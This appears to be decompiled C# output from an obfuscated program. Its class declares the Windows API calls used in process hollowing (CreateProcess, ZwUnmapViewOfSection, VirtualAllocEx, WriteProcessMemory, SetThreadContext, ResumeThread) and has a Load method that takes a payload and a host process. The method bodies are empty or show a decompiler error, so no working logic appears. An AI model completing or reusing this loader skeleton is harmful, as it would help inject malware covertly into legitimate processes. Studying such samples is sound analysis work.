using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace daddy
{
	// Token: 0x0200001E RID: 30
	public static class Stream
	{
		// Token: 0x060000BA RID: 186 RVA: 0x00040DB8 File Offset: 0x0003D3B8
		[Obfuscation(Feature = "virtualization", Exclude = true)]
		[MethodImpl(MethodImplOptions.NoInlining)]
		private static IntPtr Align(IntPtr source, int alignment)
		{
		}

		// Token: 0x060000BB RID: 187 RVA: 0x00040E00 File Offset: 0x0003D400
		[Obfuscation(Feature = "virtualization", Exclude = true)]
		[MethodImpl(MethodImplOptions.NoInlining)]
		private static IntPtr Allocate(int size, int alignment)
		{
		}

		// Token: 0x060000BC RID: 188
		[DllImport("kernel32.dll")]
		private static extern bool CloseHandle(long handle);

		// Token: 0x060000BD RID: 189
		[DllImport("kernel32.dll")]
		private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, byte[] lpStartupInfo, byte[] lpProcessInformation);

		// Token: 0x060000BE RID: 190
		[DllImport("kernel32.dll")]
		private static extern bool GetThreadContext(long hThread, IntPtr lpContext);

		// Token: 0x060000BF RID: 191 RVA: 0x00040E34 File Offset: 0x0003D434
		[Obfuscation(Feature = "virtualization", Exclude = true)]
		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void Load(byte[] payloadBuffer, string host, string args)
		{
			/*
An exception occurred when decompiling this method (060000BF)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void daddy.Stream::Load(System.Byte[],System.String,System.String)

 ---> System.OverflowException: Arithmetic operation resulted in an overflow.
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackSlot.ModifyStack(StackSlot[] stack, Int32 popCount, Int32 pushCount, ByteCode pushDefinition) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 47
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 387
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 269
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 112
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 88
   --- End of inner exception stack trace ---
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 92
   at ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:line 1533
*/;
		}

		// Token: 0x060000C0 RID: 192
		[DllImport("kernel32.dll")]
		private static extern uint ResumeThread(long hThread);

		// Token: 0x060000C1 RID: 193
		[DllImport("kernel32.dll")]
		private static extern bool SetThreadContext(long hThread, IntPtr lpContext);

		// Token: 0x060000C2 RID: 194
		[DllImport("kernel32.dll")]
		private static extern long VirtualAllocEx(long hProcess, long lpAddress, long dwSize, uint flAllocationType, uint flProtect);

		// Token: 0x060000C3 RID: 195
		[DllImport("kernel32.dll")]
		private static extern long WriteProcessMemory(long hProcess, long lpBaseAddress, byte[] lrpBuffer, int nSize, long written);

		// Token: 0x060000C4 RID: 196
		[DllImport("ntdll.dll")]
		private static extern uint ZwUnmapViewOfSection(long ProcessHandle, long BaseAddress);
	}
}
